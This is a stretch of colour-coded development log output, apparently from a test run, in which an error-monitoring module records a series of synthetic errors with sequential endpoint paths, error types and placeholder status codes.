WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2858'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2859'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841083Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2860'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841132Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2861'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2862'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2863'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841360Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2864'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841414Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2865'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2866'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2867'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2868'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2869'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2870'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2871'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2872'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2873'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2874'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2875'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.841968Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2876'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2877'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2878'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2879'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842161Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2880'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2881'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2882'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2883'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842451Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2884'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2885'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2886'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842609Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2887'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842661Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2888'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842714Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2889'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2890'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842819Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2891'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842871Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2892'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2893'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.842974Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2894'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843119Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2895'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843197Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2896'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2897'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
